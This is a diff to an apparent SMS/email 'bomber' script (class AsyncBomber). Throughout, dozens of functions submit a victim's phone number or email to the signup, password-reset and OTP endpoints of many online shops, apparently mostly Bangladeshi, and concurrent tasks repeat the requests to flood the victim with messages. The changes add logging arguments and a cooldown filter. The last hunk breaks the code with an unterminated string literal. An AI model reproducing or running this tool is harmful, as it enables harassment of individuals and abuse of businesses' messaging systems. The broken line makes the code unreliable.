+            await self.log_event("EMAIL8 - MrMedicineMart Signup", False, "Error", api_key="EMAIL8 - MrMedicineMart Signup")
             return False
 
 
@@ -3177,10 +3181,10 @@ class AsyncBomber:
         try:
             async with self.session.post(url, data={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("EMAIL9 - MrMedicineMart Reset", success, res.status)
+                await self.log_event("EMAIL9 - MrMedicineMart Reset", success, res.status, api_key="EMAIL9 - MrMedicineMart Reset")
                 return success
         except Exception:
-            await self.log_event("EMAIL9 - MrMedicineMart Reset", False, "Error")
+            await self.log_event("EMAIL9 - MrMedicineMart Reset", False, "Error", api_key="EMAIL9 - MrMedicineMart Reset")
             return False
 
 
@@ -3190,10 +3194,10 @@ class AsyncBomber:
         try:
             async with self.session.post(url, json=json.loads('{"customer":{"email":"{phone}","firstname":"{randomName}","lastname":"{randomName}","custom_attributes":{"mobilenumber":"{randomPhone}"}},"password":"Sojib12345"}'.replace('{phone}', target).replace('{target}', target).replace('{randomName}', get_random_name()).replace('{randomEmail}', get_random_email()).replace('{randomPhone}', get_random_phone())), headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("EMAIL10 - Robishop Create", success, res.status)
+                await self.log_event("EMAIL10 - Robishop Create", success, res.status, api_key="EMAIL10 - Robishop Create")
                 return success
         except Exception:
-            await self.log_event("EMAIL10 - Robishop Create", False, "Error")
+            await self.log_event("EMAIL10 - Robishop Create", False, "Error", api_key="EMAIL10 - Robishop Create")
             return False
 
 
@@ -3203,10 +3207,10 @@ class AsyncBomber:
         try:
             async with self.session.post(url, json=json.loads('{"email":"{phone}"}'.replace('{phone}', target).replace('{target}', target).replace('{randomName}', get_random_name()).replace('{randomEmail}', get_random_email()).replace('{randomPhone}', get_random_phone())), headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("EMAIL11 - Robishop Reset", success, res.status)
+                await self.log_event("EMAIL11 - Robishop Reset", success, res.status, api_key="EMAIL11 - Robishop Reset")
                 return success
         except Exception:
-            await self.log_event("EMAIL11 - Robishop Reset", False, "Error")
+            await self.log_event("EMAIL11 - Robishop Reset", False, "Error", api_key="EMAIL11 - Robishop Reset")
             return False
 
 
@@ -3216,10 +3220,10 @@ class AsyncBomber:
         try:
             async with self.session.post(url, json=json.loads('{"login":"{phone}"}'.replace('{phone}', target).replace('{target}', target).replace('{randomName}', get_random_name()).replace('{randomEmail}', get_random_email()).replace('{randomPhone}', get_random_phone())), headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("EMAIL12 - SingerBD OTP", success, res.status)
+                await self.log_event("EMAIL12 - SingerBD OTP", success, res.status, api_key="EMAIL12 - SingerBD OTP")
                 return success
         except Exception:
-            await self.log_event("EMAIL12 - SingerBD OTP", False, "Error")
+            await self.log_event("EMAIL12 - SingerBD OTP", False, "Error", api_key="EMAIL12 - SingerBD OTP")
             return False
 
 
@@ -3229,10 +3233,10 @@ class AsyncBomber:
         try:
             async with self.session.post(url, data={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("EMAIL13 - Potakait Register", success, res.status)
+                await self.log_event("EMAIL13 - Potakait Register", success, res.status, api_key="EMAIL13 - Potakait Register")
                 return success
         except Exception:
-            await self.log_event("EMAIL13 - Potakait Register", False, "Error")
+            await self.log_event("EMAIL13 - Potakait Register", False, "Error", api_key="EMAIL13 - Potakait Register")
             return False
 
 
@@ -3242,10 +3246,10 @@ class AsyncBomber:
         try:
             async with self.session.post(url, data={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("EMAIL14 - ElectronicsBD Register", success, res.status)
+                await self.log_event("EMAIL14 - ElectronicsBD Register", success, res.status, api_key="EMAIL14 - ElectronicsBD Register")
                 return success
         except Exception:
-            await self.log_event("EMAIL14 - ElectronicsBD Register", False, "Error")
+            await self.log_event("EMAIL14 - ElectronicsBD Register", False, "Error", api_key="EMAIL14 - ElectronicsBD Register")
             return False
 
 
@@ -3255,10 +3259,10 @@ class AsyncBomber:
         try:
             async with self.session.post(url, data={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("EMAIL15 - ElectronicsBD Recovery", success, res.status)
+                await self.log_event("EMAIL15 - ElectronicsBD Recovery", success, res.status, api_key="EMAIL15 - ElectronicsBD Recovery")
                 return success
         except Exception:
-            await self.log_event("EMAIL15 - ElectronicsBD Recovery", False, "Error")
+            await self.log_event("EMAIL15 - ElectronicsBD Recovery", False, "Error", api_key="EMAIL15 - ElectronicsBD Recovery")
             return False
 
 
@@ -3268,10 +3272,10 @@ class AsyncBomber:
         try:
             async with self.session.post(url, data={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("EMAIL16 - GlobalBrand Register", success, res.status)
+                await self.log_event("EMAIL16 - GlobalBrand Register", success, res.status, api_key="EMAIL16 - GlobalBrand Register")
                 return success
         except Exception:
-            await self.log_event("EMAIL16 - GlobalBrand Register", False, "Error")
+            await self.log_event("EMAIL16 - GlobalBrand Register", False, "Error", api_key="EMAIL16 - GlobalBrand Register")
             return False
 
 
@@ -3281,10 +3285,10 @@ class AsyncBomber:
         try:
             async with self.session.post(url, data={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("EMAIL17 - GlobalBrand Forgot", success, res.status)
+                await self.log_event("EMAIL17 - GlobalBrand Forgot", success, res.status, api_key="EMAIL17 - GlobalBrand Forgot")
                 return success
         except Exception:
-            await self.log_event("EMAIL17 - GlobalBrand Forgot", False, "Error")
+            await self.log_event("EMAIL17 - GlobalBrand Forgot", False, "Error", api_key="EMAIL17 - GlobalBrand Forgot")
             return False
 
 
@@ -3294,10 +3298,10 @@ class AsyncBomber:
         try:
             async with self.session.post(url, data={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("EMAIL18 - Zymak Register", success, res.status)
+                await self.log_event("EMAIL18 - Zymak Register", success, res.status, api_key="EMAIL18 - Zymak Register")
                 return success
         except Exception:
-            await self.log_event("EMAIL18 - Zymak Register", False, "Error")
+            await self.log_event("EMAIL18 - Zymak Register", False, "Error", api_key="EMAIL18 - Zymak Register")
             return False
 
 
@@ -3307,10 +3311,10 @@ class AsyncBomber:
         try:
             async with self.session.post(url, data={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("EMAIL19 - Zymak Lost Password", success, res.status)
+                await self.log_event("EMAIL19 - Zymak Lost Password", success, res.status, api_key="EMAIL19 - Zymak Lost Password")
                 return success
         except Exception:
-            await self.log_event("EMAIL19 - Zymak Lost Password", False, "Error")
+            await self.log_event("EMAIL19 - Zymak Lost Password", False, "Error", api_key="EMAIL19 - Zymak Lost Password")
             return False
 
 
@@ -3320,10 +3324,10 @@ class AsyncBomber:
         try:
             async with self.session.post(url, data={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("EMAIL20 - Shopz Register", success, res.status)
+                await self.log_event("EMAIL20 - Shopz Register", success, res.status, api_key="EMAIL20 - Shopz Register")
                 return success
         except Exception:
-            await self.log_event("EMAIL20 - Shopz Register", False, "Error")
+            await self.log_event("EMAIL20 - Shopz Register", False, "Error", api_key="EMAIL20 - Shopz Register")
             return False
 
 
@@ -3333,10 +3337,10 @@ class AsyncBomber:
         try:
             async with self.session.post(url, data={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("EMAIL21 - Shopz Lost Password", success, res.status)
+                await self.log_event("EMAIL21 - Shopz Lost Password", success, res.status, api_key="EMAIL21 - Shopz Lost Password")
                 return success
         except Exception:
-            await self.log_event("EMAIL21 - Shopz Lost Password", False, "Error")
+            await self.log_event("EMAIL21 - Shopz Lost Password", False, "Error", api_key="EMAIL21 - Shopz Lost Password")
             return False
 
 
@@ -3346,10 +3350,10 @@ class AsyncBomber:
         try:
             async with self.session.post(url, data={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("EMAIL22 - Xclusivebrands Register", success, res.status)
+                await self.log_event("EMAIL22 - Xclusivebrands Register", success, res.status, api_key="EMAIL22 - Xclusivebrands Register")
                 return success
         except Exception:
-            await self.log_event("EMAIL22 - Xclusivebrands Register", False, "Error")
+            await self.log_event("EMAIL22 - Xclusivebrands Register", False, "Error", api_key="EMAIL22 - Xclusivebrands Register")
             return False
 
 
@@ -3359,10 +3363,10 @@ class AsyncBomber:
         try:
             async with self.session.post(url, json={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("EMAIL23 - Xclusivebrands Lost Password", success, res.status)
+                await self.log_event("EMAIL23 - Xclusivebrands Lost Password", success, res.status, api_key="EMAIL23 - Xclusivebrands Lost Password")
                 return success
         except Exception:
-            await self.log_event("EMAIL23 - Xclusivebrands Lost Password", False, "Error")
+            await self.log_event("EMAIL23 - Xclusivebrands Lost Password", False, "Error", api_key="EMAIL23 - Xclusivebrands Lost Password")
             return False
 
 
@@ -3372,10 +3376,10 @@ class AsyncBomber:
         try:
             async with self.session.post(url, data={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("EMAIL24 - GamebuyBD Register", success, res.status)
+                await self.log_event("EMAIL24 - GamebuyBD Register", success, res.status, api_key="EMAIL24 - GamebuyBD Register")
                 return success
         except Exception:
-            await self.log_event("EMAIL24 - GamebuyBD Register", False, "Error")
+            await self.log_event("EMAIL24 - GamebuyBD Register", False, "Error", api_key="EMAIL24 - GamebuyBD Register")
             return False
 
 
@@ -3385,10 +3389,10 @@ class AsyncBomber:
         try:
             async with self.session.post(url, data={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("EMAIL25 - GamebuyBD Lost Password", success, res.status)
+                await self.log_event("EMAIL25 - GamebuyBD Lost Password", success, res.status, api_key="EMAIL25 - GamebuyBD Lost Password")
                 return success
         except Exception:
-            await self.log_event("EMAIL25 - GamebuyBD Lost Password", False, "Error")
+            await self.log_event("EMAIL25 - GamebuyBD Lost Password", False, "Error", api_key="EMAIL25 - GamebuyBD Lost Password")
             return False
 
 
@@ -3398,10 +3402,10 @@ class AsyncBomber:
         try:
             async with self.session.post(url, data={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("EMAIL26 - Gameforce Register", success, res.status)
+                await self.log_event("EMAIL26 - Gameforce Register", success, res.status, api_key="EMAIL26 - Gameforce Register")
                 return success
         except Exception:
-            await self.log_event("EMAIL26 - Gameforce Register", False, "Error")
+            await self.log_event("EMAIL26 - Gameforce Register", False, "Error", api_key="EMAIL26 - Gameforce Register")
             return False
 
 
@@ -3411,10 +3415,10 @@ class AsyncBomber:
         try:
             async with self.session.post(url, data={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("EMAIL27 - Gameforce Lost Password", success, res.status)
+                await self.log_event("EMAIL27 - Gameforce Lost Password", success, res.status, api_key="EMAIL27 - Gameforce Lost Password")
                 return success
         except Exception:
-            await self.log_event("EMAIL27 - Gameforce Lost Password", False, "Error")
+            await self.log_event("EMAIL27 - Gameforce Lost Password", False, "Error", api_key="EMAIL27 - Gameforce Lost Password")
             return False
 
 
@@ -3424,10 +3428,10 @@ class AsyncBomber:
         try:
             async with self.session.post(url, data={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("EMAIL28 - GamecastleBD Register", success, res.status)
+                await self.log_event("EMAIL28 - GamecastleBD Register", success, res.status, api_key="EMAIL28 - GamecastleBD Register")
                 return success
         except Exception:
-            await self.log_event("EMAIL28 - GamecastleBD Register", False, "Error")
+            await self.log_event("EMAIL28 - GamecastleBD Register", False, "Error", api_key="EMAIL28 - GamecastleBD Register")
             return False
 
 
@@ -3437,10 +3441,10 @@ class AsyncBomber:
         try:
             async with self.session.post(url, data={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("EMAIL29 - GamecastleBD Lost Password", success, res.status)
+                await self.log_event("EMAIL29 - GamecastleBD Lost Password", success, res.status, api_key="EMAIL29 - GamecastleBD Lost Password")
                 return success
         except Exception:
-            await self.log_event("EMAIL29 - GamecastleBD Lost Password", False, "Error")
+            await self.log_event("EMAIL29 - GamecastleBD Lost Password", False, "Error", api_key="EMAIL29 - GamecastleBD Lost Password")
             return False
 
 
@@ -3450,10 +3454,10 @@ class AsyncBomber:
         try:
             async with self.session.post(url, data={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("EMAIL30 - TechshopBD Signup", success, res.status)
+                await self.log_event("EMAIL30 - TechshopBD Signup", success, res.status, api_key="EMAIL30 - TechshopBD Signup")
                 return success
         except Exception:
-            await self.log_event("EMAIL30 - TechshopBD Signup", False, "Error")
+            await self.log_event("EMAIL30 - TechshopBD Signup", False, "Error", api_key="EMAIL30 - TechshopBD Signup")
             return False
 
 
@@ -3463,10 +3467,10 @@ class AsyncBomber:
         try:
             async with self.session.post(url, data={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("EMAIL31 - ElectronicShopBD Ajax Register", success, res.status)
+                await self.log_event("EMAIL31 - ElectronicShopBD Ajax Register", success, res.status, api_key="EMAIL31 - ElectronicShopBD Ajax Register")
                 return success
         except Exception:
-            await self.log_event("EMAIL31 - ElectronicShopBD Ajax Register", False, "Error")
+            await self.log_event("EMAIL31 - ElectronicShopBD Ajax Register", False, "Error", api_key="EMAIL31 - ElectronicShopBD Ajax Register")
             return False
 
 
@@ -3476,10 +3480,10 @@ class AsyncBomber:
         try:
             async with self.session.post(url, data={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("EMAIL32 - ElectronicShopBD Lost Password", success, res.status)
+                await self.log_event("EMAIL32 - ElectronicShopBD Lost Password", success, res.status, api_key="EMAIL32 - ElectronicShopBD Lost Password")
                 return success
         except Exception:
-            await self.log_event("EMAIL32 - ElectronicShopBD Lost Password", False, "Error")
+            await self.log_event("EMAIL32 - ElectronicShopBD Lost Password", False, "Error", api_key="EMAIL32 - ElectronicShopBD Lost Password")
             return False
 
 
@@ -3489,10 +3493,10 @@ class AsyncBomber:
         try:
             async with self.session.post(url, json={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("EMAIL33 - MakersBD Register", success, res.status)
+                await self.log_event("EMAIL33 - MakersBD Register", success, res.status, api_key="EMAIL33 - MakersBD Register")
                 return success
         except Exception:
-            await self.log_event("EMAIL33 - MakersBD Register", False, "Error")
+            await self.log_event("EMAIL33 - MakersBD Register", False, "Error", api_key="EMAIL33 - MakersBD Register")
             return False
 
 
@@ -3502,10 +3506,10 @@ class AsyncBomber:
         try:
             async with self.session.post(url, data={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("EMAIL34 - ABE Register", success, res.status)
+                await self.log_event("EMAIL34 - ABE Register", success, res.status, api_key="EMAIL34 - ABE Register")
                 return success
         except Exception:
-            await self.log_event("EMAIL34 - ABE Register", False, "Error")
+            await self.log_event("EMAIL34 - ABE Register", False, "Error", api_key="EMAIL34 - ABE Register")
             return False
 
 
@@ -3515,10 +3519,10 @@ class AsyncBomber:
         try:
             async with self.session.post(url, data={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("EMAIL35 - ABE Forget Password", success, res.status)
+                await self.log_event("EMAIL35 - ABE Forget Password", success, res.status, api_key="EMAIL35 - ABE Forget Password")
                 return success
         except Exception:
-            await self.log_event("EMAIL35 - ABE Forget Password", False, "Error")
+            await self.log_event("EMAIL35 - ABE Forget Password", False, "Error", api_key="EMAIL35 - ABE Forget Password")
             return False
 
 
@@ -3528,10 +3532,10 @@ class AsyncBomber:
         try:
             async with self.session.post(url, data={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("EMAIL36 - ColorCrazeBD Signup", success, res.status)
+                await self.log_event("EMAIL36 - ColorCrazeBD Signup", success, res.status, api_key="EMAIL36 - ColorCrazeBD Signup")
                 return success
         except Exception:
-            await self.log_event("EMAIL36 - ColorCrazeBD Signup", False, "Error")
+            await self.log_event("EMAIL36 - ColorCrazeBD Signup", False, "Error", api_key="EMAIL36 - ColorCrazeBD Signup")
             return False
 
 
@@ -3541,10 +3545,10 @@ class AsyncBomber:
         try:
             async with self.session.post(url, data={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("EMAIL37 - ColorCrazeBD Reset", success, res.status)
+                await self.log_event("EMAIL37 - ColorCrazeBD Reset", success, res.status, api_key="EMAIL37 - ColorCrazeBD Reset")
                 return success
         except Exception:
-            await self.log_event("EMAIL37 - ColorCrazeBD Reset", False, "Error")
+            await self.log_event("EMAIL37 - ColorCrazeBD Reset", False, "Error", api_key="EMAIL37 - ColorCrazeBD Reset")
             return False
 
 
@@ -3554,10 +3558,10 @@ class AsyncBomber:
         try:
             async with self.session.post(url, data={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("EMAIL38 - ChowdhuryElectronics Register", success, res.status)
+                await self.log_event("EMAIL38 - ChowdhuryElectronics Register", success, res.status, api_key="EMAIL38 - ChowdhuryElectronics Register")
                 return success
         except Exception:
-            await self.log_event("EMAIL38 - ChowdhuryElectronics Register", False, "Error")
+            await self.log_event("EMAIL38 - ChowdhuryElectronics Register", False, "Error", api_key="EMAIL38 - ChowdhuryElectronics Register")
             return False
 
 
@@ -3567,10 +3571,10 @@ class AsyncBomber:
         try:
             async with self.session.post(url, json={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("EMAIL39 - Smartview Register", success, res.status)
+                await self.log_event("EMAIL39 - Smartview Register", success, res.status, api_key="EMAIL39 - Smartview Register")
                 return success
         except Exception:
-            await self.log_event("EMAIL39 - Smartview Register", False, "Error")
+            await self.log_event("EMAIL39 - Smartview Register", False, "Error", api_key="EMAIL39 - Smartview Register")
             return False
 
 
@@ -3580,10 +3584,10 @@ class AsyncBomber:
         try:
             async with self.session.get(url, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("EMAIL40 - Smartview Verify Resend", success, res.status)
+                await self.log_event("EMAIL40 - Smartview Verify Resend", success, res.status, api_key="EMAIL40 - Smartview Verify Resend")
                 return success
         except Exception:
-            await self.log_event("EMAIL40 - Smartview Verify Resend", False, "Error")
+            await self.log_event("EMAIL40 - Smartview Verify Resend", False, "Error", api_key="EMAIL40 - Smartview Verify Resend")
             return False
 
 
@@ -3593,10 +3597,10 @@ class AsyncBomber:
         try:
             async with self.session.post(url, data={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("EMAIL41 - Smartview Password Code", success, res.status)
+                await self.log_event("EMAIL41 - Smartview Password Code", success, res.status, api_key="EMAIL41 - Smartview Password Code")
                 return success
         except Exception:
-            await self.log_event("EMAIL41 - Smartview Password Code", False, "Error")
+            await self.log_event("EMAIL41 - Smartview Password Code", False, "Error", api_key="EMAIL41 - Smartview Password Code")
             return False
 
 
@@ -3606,10 +3610,10 @@ class AsyncBomber:
         try:
             async with self.session.post(url, data={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("EMAIL42 - Gadstyle Register", success, res.status)
+                await self.log_event("EMAIL42 - Gadstyle Register", success, res.status, api_key="EMAIL42 - Gadstyle Register")
                 return success
         except Exception:
-            await self.log_event("EMAIL42 - Gadstyle Register", False, "Error")
+            await self.log_event("EMAIL42 - Gadstyle Register", False, "Error", api_key="EMAIL42 - Gadstyle Register")
             return False
 
 
@@ -3619,10 +3623,10 @@ class AsyncBomber:
         try:
             async with self.session.post(url, data={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("EMAIL43 - Gadstyle Lost Password", success, res.status)
+                await self.log_event("EMAIL43 - Gadstyle Lost Password", success, res.status, api_key="EMAIL43 - Gadstyle Lost Password")
                 return success
         except Exception:
-            await self.log_event("EMAIL43 - Gadstyle Lost Password", False, "Error")
+            await self.log_event("EMAIL43 - Gadstyle Lost Password", False, "Error", api_key="EMAIL43 - Gadstyle Lost Password")
             return False
 
 
@@ -3632,10 +3636,10 @@ class AsyncBomber:
         try:
             async with self.session.post(url, data={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("EMAIL44 - Havit Register", success, res.status)
+                await self.log_event("EMAIL44 - Havit Register", success, res.status, api_key="EMAIL44 - Havit Register")
                 return success
         except Exception:
-            await self.log_event("EMAIL44 - Havit Register", False, "Error")
+            await self.log_event("EMAIL44 - Havit Register", False, "Error", api_key="EMAIL44 - Havit Register")
             return False
 
 
@@ -3645,10 +3649,10 @@ class AsyncBomber:
         try:
             async with self.session.post(url, data={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("EMAIL45 - Havit Lost Password", success, res.status)
+                await self.log_event("EMAIL45 - Havit Lost Password", success, res.status, api_key="EMAIL45 - Havit Lost Password")
                 return success
         except Exception:
-            await self.log_event("EMAIL45 - Havit Lost Password", False, "Error")
+            await self.log_event("EMAIL45 - Havit Lost Password", False, "Error", api_key="EMAIL45 - Havit Lost Password")
             return False
 
 
@@ -3658,10 +3662,10 @@ class AsyncBomber:
         try:
             async with self.session.post(url, data={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("EMAIL46 - HTEBD Register", success, res.status)
+                await self.log_event("EMAIL46 - HTEBD Register", success, res.status, api_key="EMAIL46 - HTEBD Register")
                 return success
         except Exception:
-            await self.log_event("EMAIL46 - HTEBD Register", False, "Error")
+            await self.log_event("EMAIL46 - HTEBD Register", False, "Error", api_key="EMAIL46 - HTEBD Register")
             return False
 
 
@@ -3671,10 +3675,10 @@ class AsyncBomber:
         try:
             async with self.session.post(url, data={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("EMAIL47 - HTEBD Lost Password", success, res.status)
+                await self.log_event("EMAIL47 - HTEBD Lost Password", success, res.status, api_key="EMAIL47 - HTEBD Lost Password")
                 return success
         except Exception:
-            await self.log_event("EMAIL47 - HTEBD Lost Password", False, "Error")
+            await self.log_event("EMAIL47 - HTEBD Lost Password", False, "Error", api_key="EMAIL47 - HTEBD Lost Password")
             return False
 
 
@@ -3684,10 +3688,10 @@ class AsyncBomber:
         try:
             async with self.session.post(url, data={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("EMAIL48 - ShanBD Register", success, res.status)
+                await self.log_event("EMAIL48 - ShanBD Register", success, res.status, api_key="EMAIL48 - ShanBD Register")
                 return success
         except Exception:
-            await self.log_event("EMAIL48 - ShanBD Register", False, "Error")
+            await self.log_event("EMAIL48 - ShanBD Register", False, "Error", api_key="EMAIL48 - ShanBD Register")
             return False
 
     async def bomb_task(self):
@@ -3715,7 +3719,23 @@ class AsyncBomber:
                 break
 
             # Filter out APIs that are currently in cooldown
-            available_apis = [api_func for api_func in apis if api_func.__name__[4:].lower() not in self.api_cooldowns or asyncio.get_event_loop().time() > self.api_cooldowns[api_func.__name__[4:].lower()]]
+            # We need to map the API function to its display name used in log_event
+            # For simplicity, we'll use a more robust check
+            available_apis = []
+            current_time = asyncio.get_event_loop().time()
+            for api_func in apis:
+                # Extract the display name part from the function name for matching
+                # e.g., api_api109___chaldal_otp -> API109 - Chaldal OTP
+                parts = api_func.__name__.split('___')
+                if len(parts) > 1:
+                    api_id = parts[0].replace('api_', '').upper()
+                    api_name_part = parts[1].replace('_', ' ').title()
+                    display_name = f"{api_id} - {api_name_part}"
+                else:
+                    display_name = api_func.__name__
+                
+                if display_name.lower() not in self.api_cooldowns or current_time > self.api_cooldowns[display_name.lower()]:
+                    available_apis.append(api_func)
 
             if not available_apis:
                 logging.warning(f"{Y}[!] All APIs are in cooldown. Waiting for {self.backoff_time} seconds.{W}")
@@ -3792,7 +3812,7 @@ async def main():
                 bombing_tasks = [asyncio.create_task(bomber.bomb_task()) for _ in range(tasks_count)]
 
                 # Task to wait for user input to stop the bombing
-                input_task = asyncio.create_task(asyncio.to_thread(input, ""))
+                input_task = asyncio.create_task(asyncio.to_thread(input, "))
                 
                 # Wait for either all bombing tasks to complete (if limit is set) or user input to stop
                 # We want to stop if the user presses Enter (input_task) OR if all bombing tasks finish.
